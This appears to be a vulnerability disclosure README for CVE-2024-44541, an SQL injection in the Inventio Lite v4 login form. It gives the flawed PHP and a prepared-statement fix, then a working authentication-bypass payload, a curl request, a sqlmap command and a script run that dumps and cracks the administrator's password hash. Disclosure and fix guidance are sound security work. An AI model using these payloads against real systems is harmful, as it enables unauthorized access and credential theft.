# CVE-2024-44541: SQL Injection Vulnerability in Inventio Lite v4

## Description

Inventio Lite v4 is vulnerable to SQL Injection (SQLi) in the `/action=processlogin` endpoint. This vulnerability allows attackers to inject arbitrary SQL queries via the `username` parameter in POST requests, potentially leading to unauthorized access and data extraction.

## Vulnerable Code

The vulnerable code is as follows:

```php
if(!isset($_SESSION["user_id"])) {
    $user = $_POST['username'];
    $pass = sha1(md5($_POST['password']));

    $base = new Database();
    $con = $base->connect();
    $sql = "select * from user where (email= \"".$user."\" or username= \"".$user."\") and password= \"".$pass."\" and is_active=1";
    $query = $con->query($sql);
    $found = false;
    $userid = null;
    while($r = $query->fetch_array()){
        $found = true;
        $userid = $r['id'];
    }
}
```

Screenshot of the Vulnerable Code:
![Vulnerable Code](https://github.com/pointedsec/Inventio-Lite-Exploit-SQLi/blob/main/Screenshot_1.png?raw=true)


## Fixed Code

The issue is fixed by using prepared statements:
```php
if(!isset($_SESSION["user_id"])) {
    $user = $_POST['username'];
    $pass = sha1(md5($_POST['password']));

    $base = new Database();
    $con = $base->connect();

    // Prepare the query
    $stmt = $con->prepare("
        SELECT * FROM user 
        WHERE (email = ? OR username = ?) 
        AND password = ? 
        AND is_active = 1
    ");

    // Bind parameters
    $stmt->bind_param("sss", $user, $user, $pass);

    // Execute query
    $stmt->execute();

    // Get result
    $result = $stmt->get_result();
    $found = false;
    $userid = null;

    while($r = $result->fetch_assoc()){
        $found = true;
        $userid = $r['id'];
    }

    // Close statement
    $stmt->close();
}
```

## Exploitation

### Auth Bypass Payload

To exploit this vulnerability, use the following payload:
```
user -> ") or 1=1-- - 
pass -> blablalba
```

Example of the attack using `curl`:
```shell
$ curl -X POST http://192.168.1.51/inventio-lite/?action=processlogin -d 'username=%22%29%20or%201%3D1--%20-&password=blablabla' -v && echo ""
```

### SQLMap Example

```shell
$ sqlmap -u http://192.168.1.51/inventio-lite/?action=processlogin --data="username=*&password=*" --level 5 --risk 3 --dbms=mysql --dbs --prefix='")' --batch --dbs
```

## Exploit Script

To automate the exploitation and extraction of the administrator's username and password hash, you can use the provided Python script, `sqli.py`. 

You can clone this repository
```shell
git clone https://github.com/pointedsec/CVE-2024-44541
```

Then install the requirements with `pip`
```shell
pip install -r requirements.txt
```

Modify the following variables in the script as needed:
- `BASE_URL` = "[http://192.168.1.51/inventio-lite/](http://192.168.1.51/inventio-lite/)"
- `PWD_DIC_PATH` = "/usr/share/wordlists/rockyou.txt"

And execute the script, this will dump the Administrator username and hash, then tries to crack the hash with the `SHA1(MD5(password))` format.

Example output:
```console
$ python3 sqli.py 
[*] Checking if target is vulnerable
[+] Target Vulnerable!
[*] Dumping Administrator username...
[◤] Extracting Username: -> POINTEDSEC@GMAIL.COM
[/] Extracting Admin Password Hash: Final Admin Hash: 90b9aa7e25f80cf4f64e990b78a9fc5ebd6cecad
[+] Password Decrypted! -> POINTEDSEC@GMAIL.COM:admin
[*] Try to Log In with that username, if that doesn't work, try with some uppercase/lowercase combinations
```

## Impact

**Confidentiality:** Attackers can dump the entire database, exposing sensitive data such as user credentials and personal information.

**Integrity:** Attackers can bypass authentication and gain administrative access, allowing them to modify or delete data.

## References

- [Inventio Lite GitHub Repository](https://github.com/evilnapsis/inventio-lite)
- https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2024-44541
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44541
- https://nvd.nist.gov/vuln/detail/CVE-2024-44541

## Credits

This vulnerability report was identified by Andrés Del Cerro. For further details, please contact me in pointedpentesting@gmail.com

---
